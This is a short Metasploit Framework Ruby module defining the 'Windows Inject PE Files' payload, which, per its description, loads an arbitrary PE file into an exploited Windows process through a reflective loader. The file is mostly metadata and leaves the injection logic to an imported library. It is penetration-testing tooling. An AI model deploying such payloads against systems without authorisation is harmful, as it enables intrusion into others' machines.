##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core/payload/windows/peinject'

###
#
# Injects an arbitrary PE file in the exploited process via reflective PE loader.
#
###
module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Windows::PEInject
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Inject PE Files',
        'Description' => %q{
          Inject a custom native PE file into the exploited process using a relective PE loader stub.
          Reflective PE payload will be started in a new thread inside the target process.
        },
        'Author' =>
            [
              'ege <egebalci[at]pm.me>'
            ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'References' =>
            [
              'https://github.com/EgeBalci/Amber'
            ],
        'PayloadCompat' =>
            {
              'Convention' => 'sockedi handleedi -http -https'
            }
      )
    )
  end
end
